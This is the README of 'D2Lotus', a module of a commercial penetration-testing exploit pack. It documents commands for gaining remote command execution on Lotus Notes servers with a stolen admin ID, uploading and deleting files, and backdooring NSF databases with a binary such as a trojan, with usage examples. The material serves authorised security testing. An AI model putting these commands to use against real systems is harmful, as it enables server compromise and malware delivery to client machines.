D2 Exploitation Pack
====================

Copyright (c) 2007-2008 DSquare Security, LLC


License information
-------------------

See the file "LICENSE.txt" for information on the history of this
software, terms & conditions for usage, and a DISCLAIMER OF ALL
WARRANTIES.


D2Lotus - Owning Lotus Notes Server & Client
--------------------------------------------

INTRODUCTION

There are several ways to get a Lotus Notes ID during a pentest
(access to a share with all the IDs, client side exploitation, ...)
After that, if needed, you can crack the password ID with commercial or
free tools (ID Password Recovery for example)

So what can you do with an admin ID? Potentially two things:
1) Compromise the Lotus Notes server
2) Compromise the computer of the Lotus Notes clients

D2Lotus is designed to help you in this kind of work. Here are two
demonstrations of this tool:

1) Remote code execution on a Lotus Notes server:
   http://www.d2sec.com/d2lotus_1.htm
  
2) Remote code execution on computer user via Lotus Notes Client:
   http://www.d2sec.com/d2lotus_2.htm 


PREREQUISITE

D2Lotus needs Lotus Notes Client 6.x/7.x/8.x installed and nnotes.dll
path in the PATH environment.

A valid notes.ini for the target server must be set in the Lotus Notes
directory (see notes.ini example)

D2Lotus was tested with Lotus Notes 6.x/7.x/8.x


COMMANDS

backdoor <srv> <db> <bin> Backdoor NSF database
dblist <srv> <dir>        List NSF databases
delete <srv> <db> <file>  Delete file on server via NSF database
exit                      Exit
help                      Display help
rexec <srv> <db> <cmd>    Execute command on server via NSF database
upload <srv> <db> <file>  Upload file on server via NSF database

You always need to choose a NSF database to be used as a relay for the 
command (<db> parameter) <file> and <cmd> parameters must be between 
quotes.


EXAMPLES

- List NSF databases: 
  dblist w2ksrv

- List NSF databases in a directory : 
  dblist w2ksrv mail/

- Execute command on server
  rexec w2ksrv homepage.nsf "calc.exe"

- Upload a file on server
  upload w2ksrv homepage.nsf "c:\myfile"

- Backdoor a NSF database with a binary
  backdoor w2ksrv mail/aadmin.nsf "c:\trojan.exe"

